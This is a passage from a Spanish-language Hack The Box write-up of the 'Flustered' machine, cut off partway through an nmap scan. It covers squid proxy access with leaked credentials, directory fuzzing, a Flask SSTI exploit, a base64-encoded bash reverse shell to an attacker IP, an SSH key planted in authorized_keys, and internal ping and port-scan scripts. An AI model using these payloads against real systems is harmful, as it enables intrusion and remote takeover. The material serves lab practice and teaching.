+<div class="highlight"><pre><span></span><code><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="c1"># Acceso a Squid Proxy desde curl:</span>
+<a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a>&gt; curl -v -s --proxy <span class="s1">&#39;http://10.10.11.131:3128&#39;</span> -U <span class="s1">&#39;lance.friedman:o&gt;WJ5-jD&lt;5^m3&#39;</span> http://10.10.11.131/
+<a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a>
+<a id="__codelineno-2-4" name="__codelineno-2-4" href="#__codelineno-2-4"></a><span class="c1"># Variante:</span>
+<a id="__codelineno-2-5" name="__codelineno-2-5" href="#__codelineno-2-5"></a>&gt; curl -v -s --proxy <span class="s1">&#39;http://lance.friedman:o&gt;WJ5-jD&lt;5^m3@10.10.11.131:3128&#39;</span> <span class="m">10</span>.10.11.131
+<a id="__codelineno-2-6" name="__codelineno-2-6" href="#__codelineno-2-6"></a>
+<a id="__codelineno-2-7" name="__codelineno-2-7" href="#__codelineno-2-7"></a><span class="c1"># Acceso con Proxychains:</span>
+<a id="__codelineno-2-8" name="__codelineno-2-8" href="#__codelineno-2-8"></a>&gt; tail /etc/proxychains.conf                                                          
+<a id="__codelineno-2-9" name="__codelineno-2-9" href="#__codelineno-2-9"></a> <span class="c1"># add proxy here ...</span>
+<a id="__codelineno-2-10" name="__codelineno-2-10" href="#__codelineno-2-10"></a> <span class="c1">#socks5 127.0.0.1 1080</span>
+<a id="__codelineno-2-11" name="__codelineno-2-11" href="#__codelineno-2-11"></a> http <span class="m">10</span>.10.11.131 <span class="m">3128</span> lance.friedman o&gt;WJ5-jD&lt;<span class="m">5</span>^m3
+<a id="__codelineno-2-12" name="__codelineno-2-12" href="#__codelineno-2-12"></a> <span class="c1">#http 127.0.0.1 8080</span>
+<a id="__codelineno-2-13" name="__codelineno-2-13" href="#__codelineno-2-13"></a>
+<a id="__codelineno-2-14" name="__codelineno-2-14" href="#__codelineno-2-14"></a>&gt; proxychains curl -s <span class="m">10</span>.10.11.131 
+<a id="__codelineno-2-15" name="__codelineno-2-15" href="#__codelineno-2-15"></a><span class="o">[</span>proxychains<span class="o">]</span> config file found: /etc/proxychains.conf
+<a id="__codelineno-2-16" name="__codelineno-2-16" href="#__codelineno-2-16"></a><span class="o">[</span>proxychains<span class="o">]</span> preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
+<a id="__codelineno-2-17" name="__codelineno-2-17" href="#__codelineno-2-17"></a><span class="o">[</span>proxychains<span class="o">]</span> DLL init: proxychains-ng <span class="m">4</span>.14
+<a id="__codelineno-2-18" name="__codelineno-2-18" href="#__codelineno-2-18"></a><span class="o">[</span>proxychains<span class="o">]</span> Strict chain  ...  <span class="m">10</span>.10.11.131:3128  ...  <span class="m">10</span>.10.11.131:80  ...  OK
+<a id="__codelineno-2-19" name="__codelineno-2-19" href="#__codelineno-2-19"></a>
+<a id="__codelineno-2-20" name="__codelineno-2-20" href="#__codelineno-2-20"></a>    &lt;html&gt;
+<a id="__codelineno-2-21" name="__codelineno-2-21" href="#__codelineno-2-21"></a>    &lt;head&gt;
+<a id="__codelineno-2-22" name="__codelineno-2-22" href="#__codelineno-2-22"></a>    &lt;title&gt;steampunk-era.htb - Coming Soon&lt;/title&gt;
+<a id="__codelineno-2-23" name="__codelineno-2-23" href="#__codelineno-2-23"></a>    &lt;/head&gt;
+<a id="__codelineno-2-24" name="__codelineno-2-24" href="#__codelineno-2-24"></a>    &lt;body <span class="nv">style</span><span class="o">=</span><span class="s2">&quot;background-image: url(&#39;/static/steampunk-3006650_1280.webp&#39;);background-size: 100%;background-repeat: no-repeat;&quot;</span>&gt; 
+<a id="__codelineno-2-25" name="__codelineno-2-25" href="#__codelineno-2-25"></a>    &lt;/body&gt;
+<a id="__codelineno-2-26" name="__codelineno-2-26" href="#__codelineno-2-26"></a>    &lt;/html&gt;
+<a id="__codelineno-2-27" name="__codelineno-2-27" href="#__codelineno-2-27"></a>
+<a id="__codelineno-2-28" name="__codelineno-2-28" href="#__codelineno-2-28"></a><span class="c1"># Fuzzing con FFUF (Hay que urlencodear algunos chars &quot;man ascii&quot;)</span>
+<a id="__codelineno-2-29" name="__codelineno-2-29" href="#__codelineno-2-29"></a>&gt; ffuf -replay-proxy <span class="s2">&quot;http://lance.friedman:o%3EWJ5-jD%3C5%5Em3@10.10.11.131:3128&quot;</span> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://127.0.0.1/FUZZ
+<a id="__codelineno-2-30" name="__codelineno-2-30" href="#__codelineno-2-30"></a>
+<a id="__codelineno-2-31" name="__codelineno-2-31" href="#__codelineno-2-31"></a><span class="c1"># Unicamente me ha funcionado bien con Gobuster:</span>
+<a id="__codelineno-2-32" name="__codelineno-2-32" href="#__codelineno-2-32"></a>gobuster dir --proxy <span class="s2">&quot;http://lance.friedman:o%3EWJ5-jD%3C5%5Em3@10.10.11.131:3128&quot;</span> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://127.0.0.1
+<a id="__codelineno-2-33" name="__codelineno-2-33" href="#__codelineno-2-33"></a>
+<a id="__codelineno-2-34" name="__codelineno-2-34" href="#__codelineno-2-34"></a>/app                  <span class="o">(</span>Status: <span class="m">301</span><span class="o">)</span> <span class="o">[</span>Size: <span class="m">185</span><span class="o">]</span> <span class="o">[</span>--&gt; http://127.0.0.1/app/<span class="o">]</span>
+</code></pre></div>
+</li>
+</ul>
+<h2 id="ssti-server-site-template-injection-reverse-shell">SSTI (Server Site Template Injection) =&gt; Reverse Shell</h2>
+<ul>
+<li>
+<p>Fuzzeando se encuentra código en python:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>gobuster dir --proxy <span class="s2">&quot;http://lance.friedman:o%3EWJ5-jD%3C5%5Em3@10.10.11.131:3128&quot;</span> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://127.0.0.1/app -x py,php
+<a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a>WJ5-jDDocumentos/htb/flustered5m3@10.10.11.131:3128<span class="s2">&quot; -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://127.0.0.1/app -x py,php - Parrot Terminal===============================================================</span>
+<a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a><span class="s2">Gobuster v3.1.0</span>
+<a id="__codelineno-3-4" name="__codelineno-3-4" href="#__codelineno-3-4"></a><span class="s2">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</span>
+<a id="__codelineno-3-5" name="__codelineno-3-5" href="#__codelineno-3-5"></a><span class="s2">===============================================================</span>
+<a id="__codelineno-3-6" name="__codelineno-3-6" href="#__codelineno-3-6"></a><span class="s2">[+] Url:                     http://127.0.0.1/app</span>
+<a id="__codelineno-3-7" name="__codelineno-3-7" href="#__codelineno-3-7"></a><span class="s2">[+] Method:                  GET</span>
+<a id="__codelineno-3-8" name="__codelineno-3-8" href="#__codelineno-3-8"></a><span class="s2">[+] Threads:                 10</span>
+<a id="__codelineno-3-9" name="__codelineno-3-9" href="#__codelineno-3-9"></a><span class="s2">[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</span>
+<a id="__codelineno-3-10" name="__codelineno-3-10" href="#__codelineno-3-10"></a><span class="s2">[+] Negative Status codes:   404</span>
+<a id="__codelineno-3-11" name="__codelineno-3-11" href="#__codelineno-3-11"></a><span class="s2">[+] Proxy:                   http://lance.friedman:o%3EWJ5-jD%3C5%5Em3@10.10.11.131:3128</span>
+<a id="__codelineno-3-12" name="__codelineno-3-12" href="#__codelineno-3-12"></a><span class="s2">[+] User Agent:              gobuster/3.1.0</span>
+<a id="__codelineno-3-13" name="__codelineno-3-13" href="#__codelineno-3-13"></a><span class="s2">[+] Extensions:              py,php</span>
+<a id="__codelineno-3-14" name="__codelineno-3-14" href="#__codelineno-3-14"></a><span class="s2">[+] Timeout:                 10s</span>
+<a id="__codelineno-3-15" name="__codelineno-3-15" href="#__codelineno-3-15"></a><span class="s2">===============================================================</span>
+<a id="__codelineno-3-16" name="__codelineno-3-16" href="#__codelineno-3-16"></a><span class="s2">2022/09/03 22:54:28 Starting gobuster in directory enumeration mode</span>
+<a id="__codelineno-3-17" name="__codelineno-3-17" href="#__codelineno-3-17"></a><span class="s2">===============================================================</span>
+<a id="__codelineno-3-18" name="__codelineno-3-18" href="#__codelineno-3-18"></a><span class="s2">/templates            (Status: 301) [Size: 185] [--&gt; http://127.0.0.1/app/templates/]</span>
+<a id="__codelineno-3-19" name="__codelineno-3-19" href="#__codelineno-3-19"></a><span class="s2">/static               (Status: 301) [Size: 185] [--&gt; http://127.0.0.1/app/static/]   </span>
+<a id="__codelineno-3-20" name="__codelineno-3-20" href="#__codelineno-3-20"></a><span class="s2">/app.py               (Status: 200) [Size: 748]                                      </span>
+<a id="__codelineno-3-21" name="__codelineno-3-21" href="#__codelineno-3-21"></a><span class="s2">/config               (Status: 301) [Size: 185] [--&gt; http://127.0.0.1/app/config/]   </span>
+</code></pre></div>
+</li>
+<li>
+<p>Revisando el código python que contiene la librería flask se puede observar que es vulnerable a inyección de código en 
+    <div class="highlight"><pre><span></span><code><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a><span class="k">def</span> <span class="nf">getsiteurl</span><span class="p">(</span><span class="n">config</span><span class="p">):</span>
+<a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a><span class="k">if</span> <span class="n">config</span> <span class="ow">and</span> <span class="s2">&quot;siteurl&quot;</span> <span class="ow">in</span> <span class="n">config</span><span class="p">:</span>
+<a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a>    <span class="k">return</span> <span class="n">config</span><span class="p">[</span><span class="s2">&quot;siteurl&quot;</span><span class="p">]</span>
+<a id="__codelineno-4-4" name="__codelineno-4-4" href="#__codelineno-4-4"></a><span class="k">else</span><span class="p">:</span>
+<a id="__codelineno-4-5" name="__codelineno-4-5" href="#__codelineno-4-5"></a>    <span class="k">return</span> <span class="s2">&quot;steampunk-era.htb&quot;</span>
+<a id="__codelineno-4-6" name="__codelineno-4-6" href="#__codelineno-4-6"></a>
+<a id="__codelineno-4-7" name="__codelineno-4-7" href="#__codelineno-4-7"></a><span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s2">&quot;/&quot;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;GET&#39;</span><span class="p">,</span> <span class="s1">&#39;POST&#39;</span><span class="p">])</span>
+<a id="__codelineno-4-8" name="__codelineno-4-8" href="#__codelineno-4-8"></a><span class="k">def</span> <span class="nf">index_page</span><span class="p">():</span>
+<a id="__codelineno-4-9" name="__codelineno-4-9" href="#__codelineno-4-9"></a><span class="c1"># Will replace this with a proper file when the site is ready</span>
+<a id="__codelineno-4-10" name="__codelineno-4-10" href="#__codelineno-4-10"></a><span class="n">config</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">json</span>
+<a id="__codelineno-4-11" name="__codelineno-4-11" href="#__codelineno-4-11"></a>
+<a id="__codelineno-4-12" name="__codelineno-4-12" href="#__codelineno-4-12"></a><span class="n">template</span> <span class="o">=</span> <span class="sa">f</span><span class="s1">&#39;&#39;&#39;</span>
+<a id="__codelineno-4-13" name="__codelineno-4-13" href="#__codelineno-4-13"></a><span class="s1">    &lt;html&gt;</span>
+<a id="__codelineno-4-14" name="__codelineno-4-14" href="#__codelineno-4-14"></a><span class="s1">    &lt;head&gt;</span>
+<a id="__codelineno-4-15" name="__codelineno-4-15" href="#__codelineno-4-15"></a><span class="s1">    &lt;title&gt;</span><span class="si">{</span><span class="n">getsiteurl</span><span class="p">(</span><span class="n">config</span><span class="p">)</span><span class="si">}</span><span class="s1"> - Coming Soon&lt;/title&gt;</span>
+<a id="__codelineno-4-16" name="__codelineno-4-16" href="#__codelineno-4-16"></a><span class="s1">    &lt;/head&gt;</span>
+<a id="__codelineno-4-17" name="__codelineno-4-17" href="#__codelineno-4-17"></a><span class="s1">    &lt;body style=&quot;background-image: url(&#39;</span><span class="si">{</span><span class="n">url_for</span><span class="p">(</span><span class="s1">&#39;static&#39;</span><span class="p">,</span> <span class="n">filename</span><span class="o">=</span><span class="s1">&#39;steampunk-3006650_1280.webp&#39;</span><span class="p">)</span><span class="si">}</span><span class="s1">&#39;);background-size: 100%;background-repeat: no-repeat;&quot;&gt; </span>
+<a id="__codelineno-4-18" name="__codelineno-4-18" href="#__codelineno-4-18"></a><span class="s1">    &lt;/body&gt;</span>
+<a id="__codelineno-4-19" name="__codelineno-4-19" href="#__codelineno-4-19"></a><span class="s1">    &lt;/html&gt;</span>
+<a id="__codelineno-4-20" name="__codelineno-4-20" href="#__codelineno-4-20"></a><span class="s1">&#39;&#39;&#39;</span>
+<a id="__codelineno-4-21" name="__codelineno-4-21" href="#__codelineno-4-21"></a><span class="k">return</span> <span class="n">render_template_string</span><span class="p">(</span><span class="n">template</span><span class="p">)</span>
+<a id="__codelineno-4-22" name="__codelineno-4-22" href="#__codelineno-4-22"></a>
+<a id="__codelineno-4-23" name="__codelineno-4-23" href="#__codelineno-4-23"></a><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&quot;__main__&quot;</span><span class="p">:</span>
+<a id="__codelineno-4-24" name="__codelineno-4-24" href="#__codelineno-4-24"></a><span class="n">app</span><span class="o">.</span><span class="n">run</span><span class="p">()</span>
+</code></pre></div></p>
+</li>
+</ul>
+<h2 id="ssti-server-side-template-injection">SSTI (Server Side Template Injection)</h2>
+<ul>
+<li>
+<p>SSTI RCE
+    <div class="highlight"><pre><span></span><code><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>GET / HTTP/1.1
+<a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a>Host: flustered.htb
+<a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a>User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0
+<a id="__codelineno-5-4" name="__codelineno-5-4" href="#__codelineno-5-4"></a>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+<a id="__codelineno-5-5" name="__codelineno-5-5" href="#__codelineno-5-5"></a>Accept-Language: en-US,en;q=0.5
+<a id="__codelineno-5-6" name="__codelineno-5-6" href="#__codelineno-5-6"></a>Accept-Encoding: gzip, deflate
+<a id="__codelineno-5-7" name="__codelineno-5-7" href="#__codelineno-5-7"></a>DNT: 1
+<a id="__codelineno-5-8" name="__codelineno-5-8" href="#__codelineno-5-8"></a>Connection: close
+<a id="__codelineno-5-9" name="__codelineno-5-9" href="#__codelineno-5-9"></a>Upgrade-Insecure-Requests: 1
+<a id="__codelineno-5-10" name="__codelineno-5-10" href="#__codelineno-5-10"></a>Content-Length: 21
+<a id="__codelineno-5-11" name="__codelineno-5-11" href="#__codelineno-5-11"></a>Content-Type: application/json
+<a id="__codelineno-5-12" name="__codelineno-5-12" href="#__codelineno-5-12"></a>
+<a id="__codelineno-5-13" name="__codelineno-5-13" href="#__codelineno-5-13"></a>{&quot;siteurl&quot;:&quot;{{5*5}}&quot;}
+</code></pre></div></p>
+</li>
+<li>
+<p>El parámetro custome es vulnerable a SSTI:</p>
+<blockquote>
+<p><code>Se adjunta el token a la páquina que no teniamos autorización</code></p>
+</blockquote>
+<p><img alt="Conectividad OK" src="../images/ssti.png" /></p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a><span class="c1"># Payload que ejecuta un ls:</span>
+<a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a><span class="s2">&quot;siteurl&quot;</span>:<span class="s2">&quot;{{config.__class__.__init__.__globals__[&#39;os&#39;].popen(&#39;ls&#39;).read()}}&quot;</span>
+</code></pre></div>
+</li>
+<li>
+<p>RCE - Forma de ejecutar una shell reversa:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a><span class="nb">echo</span> <span class="s1">&#39;bash -c &quot;bash -i &gt;&amp; /dev/tcp/10.10.14.16/4443 0&gt;&amp;1&quot;&#39;</span> <span class="p">|</span> base64   
+<a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a>YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xNi80NDQzIDA+JjEiCg<span class="o">==</span>
+<a id="__codelineno-7-3" name="__codelineno-7-3" href="#__codelineno-7-3"></a>
+<a id="__codelineno-7-4" name="__codelineno-7-4" href="#__codelineno-7-4"></a><span class="c1"># Payload para ganar acceso a la máquina víctima:</span>
+<a id="__codelineno-7-5" name="__codelineno-7-5" href="#__codelineno-7-5"></a>Content-Type: application/json
+<a id="__codelineno-7-6" name="__codelineno-7-6" href="#__codelineno-7-6"></a>
+<a id="__codelineno-7-7" name="__codelineno-7-7" href="#__codelineno-7-7"></a><span class="o">{</span><span class="s2">&quot;siteurl&quot;</span>:<span class="s2">&quot;{{config.__class__.__init__.__globals__[&#39;os&#39;].popen(&#39;echo YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xNi80NDQzIDA+JjEiCg==| base64 -d | bash&#39;).read()}}&quot;</span>
+<a id="__codelineno-7-8" name="__codelineno-7-8" href="#__codelineno-7-8"></a><span class="o">}</span>
+</code></pre></div>
+</li>
+</ul>
+<h2 id="escalate-privileges">Escalate privileges</h2>
+<ul>
+<li>
+<p>Una vez dentro de la máquina se copian los certificados que nos faltaban antes para montar el vol1:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a>&gt; ls -la /etc/ssl      
+<a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a>drwxr-xr-x root root     <span class="m">122</span> B  Sun Sep  <span class="m">4</span> <span class="m">01</span>:44:07 <span class="m">2022</span>  .
+<a id="__codelineno-8-3" name="__codelineno-8-3" href="#__codelineno-8-3"></a>drwxr-xr-x root root     <span class="m">6</span>.3 KB Sat Sep  <span class="m">3</span> <span class="m">21</span>:03:55 <span class="m">2022</span>  ..
+<a id="__codelineno-8-4" name="__codelineno-8-4" href="#__codelineno-8-4"></a>drwxr-xr-x root root      <span class="m">10</span> KB Wed Jul  <span class="m">7</span> <span class="m">20</span>:55:00 <span class="m">2021</span>  certs
+<a id="__codelineno-8-5" name="__codelineno-8-5" href="#__codelineno-8-5"></a>drwx--x--- root ssl-cert  <span class="m">42</span> B  Wed Jul  <span class="m">7</span> <span class="m">20</span>:55:00 <span class="m">2021</span>  private
+<a id="__codelineno-8-6" name="__codelineno-8-6" href="#__codelineno-8-6"></a>.rw-r--r-- root root     <span class="m">4</span>.0 KB Sun Sep  <span class="m">4</span> <span class="m">01</span>:44:06 <span class="m">2022</span>  glusterfs.ca
+<a id="__codelineno-8-7" name="__codelineno-8-7" href="#__codelineno-8-7"></a>.rw-r--r-- root root     <span class="m">3</span>.2 KB Sun Sep  <span class="m">4</span> <span class="m">01</span>:42:47 <span class="m">2022</span>  glusterfs.key
+<a id="__codelineno-8-8" name="__codelineno-8-8" href="#__codelineno-8-8"></a>.rw-r--r-- root root     <span class="m">1</span>.8 KB Sun Sep  <span class="m">4</span> <span class="m">01</span>:41:12 <span class="m">2022</span>  glusterfs.pem
+<a id="__codelineno-8-9" name="__codelineno-8-9" href="#__codelineno-8-9"></a>.rw-r--r-- root root      <span class="m">11</span> KB Thu Mar <span class="m">25</span> <span class="m">21</span>:49:34 <span class="m">2021</span>  openssl.cnf
+<a id="__codelineno-8-10" name="__codelineno-8-10" href="#__codelineno-8-10"></a>
+<a id="__codelineno-8-11" name="__codelineno-8-11" href="#__codelineno-8-11"></a>&gt; mount.glusterfs flustered.htb:/vol1 /home/x/Documentos/htb/flustered/puntodemontaje
+<a id="__codelineno-8-12" name="__codelineno-8-12" href="#__codelineno-8-12"></a>
+<a id="__codelineno-8-13" name="__codelineno-8-13" href="#__codelineno-8-13"></a>&gt; ls -la               
+<a id="__codelineno-8-14" name="__codelineno-8-14" href="#__codelineno-8-14"></a>drwxr-x--- x    docker <span class="m">4</span>.0 KB Mon Oct <span class="m">25</span> <span class="m">07</span>:49:56 <span class="m">2021</span>  .
+<a id="__codelineno-8-15" name="__codelineno-8-15" href="#__codelineno-8-15"></a>drwxr-xr-x root root   <span class="m">170</span> B  Sat Sep  <span class="m">3</span> <span class="m">23</span>:20:12 <span class="m">2022</span>  ..
+<a id="__codelineno-8-16" name="__codelineno-8-16" href="#__codelineno-8-16"></a>drwx------ x    docker <span class="m">4</span>.0 KB Mon Oct <span class="m">25</span> <span class="m">07</span>:44:58 <span class="m">2021</span>  .gnupg
+<a id="__codelineno-8-17" name="__codelineno-8-17" href="#__codelineno-8-17"></a>drwx------ x    docker <span class="m">4</span>.0 KB Tue Dec  <span class="m">7</span> <span class="m">20</span>:54:21 <span class="m">2021</span>  .ssh
+<a id="__codelineno-8-18" name="__codelineno-8-18" href="#__codelineno-8-18"></a>lrwxrwxrwx x    docker   <span class="m">9</span> B  Thu Oct <span class="m">28</span> <span class="m">08</span>:59:15 <span class="m">2021</span>  .bash_history ⇒ /dev/null
+<a id="__codelineno-8-19" name="__codelineno-8-19" href="#__codelineno-8-19"></a>.rw-r--r-- x    docker <span class="m">220</span> B  Mon Sep <span class="m">20</span> <span class="m">14</span>:27:59 <span class="m">2021</span>  .bash_logout
+<a id="__codelineno-8-20" name="__codelineno-8-20" href="#__codelineno-8-20"></a>.rw-r--r-- x    docker <span class="m">3</span>.4 KB Mon Sep <span class="m">20</span> <span class="m">14</span>:27:59 <span class="m">2021</span>  .bashrc
+<a id="__codelineno-8-21" name="__codelineno-8-21" href="#__codelineno-8-21"></a>.rw-r--r-- x    docker <span class="m">807</span> B  Mon Sep <span class="m">20</span> <span class="m">14</span>:27:59 <span class="m">2021</span>  .profile
+<a id="__codelineno-8-22" name="__codelineno-8-22" href="#__codelineno-8-22"></a>.r-------- x    docker  <span class="m">33</span> B  Sat Sep  <span class="m">3</span> <span class="m">14</span>:29:46 <span class="m">2022</span>  user.txt
+<a id="__codelineno-8-23" name="__codelineno-8-23" href="#__codelineno-8-23"></a>
+<a id="__codelineno-8-24" name="__codelineno-8-24" href="#__codelineno-8-24"></a>&gt; catn user.txt
+<a id="__codelineno-8-25" name="__codelineno-8-25" href="#__codelineno-8-25"></a>86af85b760eb29b5b87c1e0d79508480
+<a id="__codelineno-8-26" name="__codelineno-8-26" href="#__codelineno-8-26"></a>
+<a id="__codelineno-8-27" name="__codelineno-8-27" href="#__codelineno-8-27"></a><span class="c1"># Mirando el home de la máquina comprometida se observa que solo existe el usuario jennifer.</span>
+<a id="__codelineno-8-28" name="__codelineno-8-28" href="#__codelineno-8-28"></a><span class="c1"># Se deduce que el punto de montaje de vol1 es un directorio compartido de su home, por lo cual se genera un par de claves ssh y se introduce la publica dentro del authorized_keys</span>
+<a id="__codelineno-8-29" name="__codelineno-8-29" href="#__codelineno-8-29"></a>ssh-keygen -f jennifer 
+<a id="__codelineno-8-30" name="__codelineno-8-30" href="#__codelineno-8-30"></a>cat jennifer.pub &gt; authorized_keys
+<a id="__codelineno-8-31" name="__codelineno-8-31" href="#__codelineno-8-31"></a>
+<a id="__codelineno-8-32" name="__codelineno-8-32" href="#__codelineno-8-32"></a><span class="c1"># Se copia la clave privada a la máquina víctima y se accede por ssh a localhost con el usuario jennifer</span>
+<a id="__codelineno-8-33" name="__codelineno-8-33" href="#__codelineno-8-33"></a>ssh jennifer@localhost -i /dev/shm/id_rsa_jennifer <span class="o">(</span>funcionaría desde la máquina de atacante ya que es el mismo objetivo<span class="o">)</span>
+</code></pre></div>
+</li>
+</ul>
+<h2 id="escalada-a-root">Escalada a root</h2>
+<ul>
+<li>
+<p>A través de scripts de enumeración se encuentra un contenedor con un puerto abierto:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a><span class="ch">#!/bin/bash</span>
+<a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a>
+<a id="__codelineno-9-3" name="__codelineno-9-3" href="#__codelineno-9-3"></a><span class="k">for</span> i <span class="k">in</span> <span class="k">$(</span>seq <span class="m">1</span> <span class="m">254</span><span class="k">)</span><span class="p">;</span><span class="k">do</span>
+<a id="__codelineno-9-4" name="__codelineno-9-4" href="#__codelineno-9-4"></a>    timeout <span class="m">1</span> ping -c <span class="m">1</span> <span class="m">172</span>.17.0.<span class="nv">$i</span> <span class="p">&amp;</span>&gt;/dev/null <span class="o">&amp;&amp;</span> <span class="nb">echo</span> <span class="s2">&quot;[!] arriba </span><span class="nv">$i</span><span class="s2">&quot;</span> <span class="p">&amp;</span>
+<a id="__codelineno-9-5" name="__codelineno-9-5" href="#__codelineno-9-5"></a><span class="k">done</span><span class="p">;</span> <span class="nb">wait</span>
+</code></pre></div>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a><span class="ch">#!/bin/bash</span>
+<a id="__codelineno-10-2" name="__codelineno-10-2" href="#__codelineno-10-2"></a>
+<a id="__codelineno-10-3" name="__codelineno-10-3" href="#__codelineno-10-3"></a><span class="k">for</span> port <span class="k">in</span> <span class="k">$(</span>seq <span class="m">1</span> <span class="m">65535</span><span class="k">)</span><span class="p">;</span> <span class="k">do</span>
+<a id="__codelineno-10-4" name="__codelineno-10-4" href="#__codelineno-10-4"></a>    timeout <span class="m">1</span> bash -c <span class="s2">&quot;echo &#39;&#39; &gt; /dev/tcp/172.17.0.2/</span><span class="nv">$port</span><span class="s2">&quot;</span> <span class="m">2</span>&gt;/dev/null <span class="o">&amp;&amp;</span> <span class="nb">echo</span> <span class="s2">&quot;[+] puerto </span><span class="nv">$port</span><span class="s2"> abierto&quot;</span> <span class="p">&amp;</span>
+<a id="__codelineno-10-5" name="__codelineno-10-5" href="#__codelineno-10-5"></a><span class="k">done</span><span class="p">;</span> <span class="nb">wait</span>
+</code></pre></div>
+</li>
+<li>
+<p>Creamos un local port forwarding con ssh para tener mayor control:
+    <div class="highlight"><pre><span></span><code><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a>&gt; ssh -L <span class="m">10000</span>:172.17.0.2:10000 jennifer@10.10.11.131 -i jennifer
+<a id="__codelineno-11-2" name="__codelineno-11-2" href="#__codelineno-11-2"></a>
+<a id="__codelineno-11-3" name="__codelineno-11-3" href="#__codelineno-11-3"></a><span class="c1"># Es un servicio de Azure que se gestiona a través </span>
+<a id="__codelineno-11-4" name="__codelineno-11-4" href="#__codelineno-11-4"></a>&gt; nmap -sCV -p10000 localhost                                              
+<a id="__codelineno-11-5" name="__codelineno-11-5" href="#__codelineno-11-5"></a>Starting Nmap <span class="m">7</span>.92 <span class="o">(</span> https://nmap.org <span class="o">)</span> at <span class="m">2022</span>-09-04 <span class="m">03</span>:24 CEST
+<a id="__codelineno-11-6" name="__codelineno-11-6" href="#__codelineno-11-6"></a>Nmap scan report <span class="k">for</span> localhost <span class="o">(</span><span class="m">127</span>.0.0.1<span class="o">)</span>
+<a id="__codelineno-11-7" name="__codelineno-11-7" href="#__codelineno-11-7"></a>Host is up <span class="o">(</span><span class="m">0</span>.000084s latency<span class="o">)</span>.
+<a id="__codelineno-11-8" name="__codelineno-11-8" href="#__codelineno-11-8"></a>Other addresses <span class="k">for</span> localhost <span class="o">(</span>not scanned<span class="o">)</span>: ::1
+<a id="__codelineno-11-9" name="__codelineno-11-9" href="#__codelineno-11-9"></a>
+<a id="__codelineno-11-10" name="__codelineno-11-10" href="#__codelineno-11-10"></a>PORT      STATE SERVICE           VERSION
+<a id="__codelineno-11-11" name="__codelineno-11-11" href="#__codelineno-11-11"></a><span class="m">10000</span>/tcp open  snet-sensor-mgmt?
+<a id="__codelineno-11-12" name="__codelineno-11-12" href="#__codelineno-11-12"></a><span class="p">|</span> fingerprint-strings: 
+<a id="__codelineno-11-13" name="__codelineno-11-13" href="#__codelineno-11-13"></a><span class="p">|</span>   DNSStatusRequestTCP, DNSVersionBindReqTCP, Help, Kerberos, RPCCheck, RTSPRequest, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServerCookie, X11Probe: 
+<a id="__codelineno-11-14" name="__codelineno-11-14" href="#__codelineno-11-14"></a><span class="p">|</span>     HTTP/1.1 <span class="m">400</span> Bad Request
+<a id="__codelineno-11-15" name="__codelineno-11-15" href="#__codelineno-11-15"></a><span class="p">|</span>     Connection: close
+<a id="__codelineno-11-16" name="__codelineno-11-16" href="#__codelineno-11-16"></a><span class="p">|</span>   FourOhFourRequest: 
+<a id="__codelineno-11-17" name="__codelineno-11-17" href="#__codelineno-11-17"></a><span class="p">|</span>     HTTP/1.1 <span class="m">500</span> Internal Server Error
+<a id="__codelineno-11-18" name="__codelineno-11-18" href="#__codelineno-11-18"></a><span class="p">|</span>     Server: Azurite-Blob/3.14.3
+<a id="__codelineno-11-19" name="__codelineno-11-19" href="#__codelineno-11-19"></a><span class="p">|</span>     Date: Sun, <span class="m">04</span> Sep <span class="m">2022</span> <span class="m">01</span>:24:57 GMT
